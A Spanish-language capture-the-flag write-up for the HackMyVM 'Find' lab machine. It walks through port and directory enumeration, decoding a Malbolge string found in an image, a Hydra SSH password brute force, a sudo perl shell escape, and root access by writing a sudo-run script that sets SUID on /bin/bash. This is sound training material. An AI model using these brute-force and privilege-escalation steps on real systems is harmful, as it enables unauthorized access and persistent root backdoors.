# Maquina Find Hackmyvm

```
Nivel =  facil
ip: 10.10.10.93
ports : 22 80
```
## Enumeracion de puertos y Servicios

~~~
# Nmap 7.92SVN scan initiated Wed Jun 15 16:02:59 2022 as: nmap -p- -sCV -T4 -v -n -oN targeted -oX targetedXML 10.10.10.93
Nmap scan report for 10.10.10.93
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6ef79004840dcd1e5d2edab151d9bf57 (RSA)
|   256 395a6638f7649a94ddbcb6fbf8e73f87 (ECDSA)
|_  256 8c26e72662771640fbb5cfa61ce0f69d (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:11:31:1A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 15 16:03:19 2022 -- 1 IP address (1 host up) scanned in 20.00 secon
~~~

## Enumeracion de archivos y carpetas

~~~

dirsearch -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -t 64 -e txt,html,php,jpg

[16:24:44] 200 -   10KB - /index.html
[16:24:47] 403 -  276B  - /icons/      
[16:25:10] 200 -   34KB - /cat.jpg              
[16:25:16] 200 -  626B  - /manual/           
[16:25:16] 301 -  311B  - /manual  ->  http://10.10.10.93/manual/
[16:26:06] 200 -   13B  - /robots.txt  
~~~

En robots.txt nos pone que busquemos al usuario. --> find user :) .

Tenemos una imagen que contiene un codigo raro con strings cat.jpg lo veremos.

Tambien si le hacemos un file a la imagen nos reporta de donde sale la foto

~~~
file cat.jpg 
cat.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "File source: https://commons.wikimedia.org/wiki/File:Cat03.jpg", baseline, precision 8, 481x480, components 3
~~~

```bash
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

Se puede compilar en esta pagina , para dar con ella tela.
~~~
http://www.malbolge.doleczek.pl/
~~~

conseguimos un nombre de usuario y con hydra conseguimos el password

❯ hydra -l xxxxxxx -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.93 -f -t 64
Hydra v9.4-dev (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 16:22:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
[DATA] attacking ssh://10.10.10.93:22/
[22][ssh] host: 10.10.10.93   login: xxxxxxx   password: xxxxxxxx
[STATUS] attack finished for 10.10.10.93 (valid pair found)
1 of 1 target successfully completed, 1 valid password found


### User Pivoting

Del usuario xxxxxxx --> kings.

Con sudo -l podemos ejecutar perl en gtfobins encontramos la manera de ejecutar una bash.

~~~
xxxxxx@find:~$ sudo -l
[sudo] password for xxxxx: 
Matching Defaults entries for xxxxxxx on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User xxxxxx may run the following commands on find:
    (kings) /usr/bin/perl
xxxxxxxx@find:~$ sudo -u kings  perl -e 'exec "/bin/bash";'
~~~

### Escalada de Privilegios

accedemos como el user kings y encotramos la primera flag

con sudo -l podemos ejecutar un script pero no esta.

kings@find:~$ sudo -l
Matching Defaults entries for kings on find:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kings may run the following commands on find:
    (ALL) NOPASSWD: /opt/boom/boom.sh


Nos vamos a la carpeta opt y veremos que tenemos permisos de escritura creamos la carpeta boom y el archivo boom.sh.



```bash
#!/bin/bash

chmod u+s /bin/bash
```

Le damos permisos chmod +x boom.sh y lo ejecutamos --> sudo -u root /opt/boom/boom.sh.

Aqui al ejecutarlo lo que haremos es darle permisos SUID al binario /bin/bash.

Con bash -p accedemos como root.
~~~
kings@find:~$ bash -p
bash-5.0# id;whoami;hostname
uid=1002(kings) gid=1006(kings) euid=0(root) groups=1006(kings),1005(kingg)
root
find
bash-5.0#
~~~
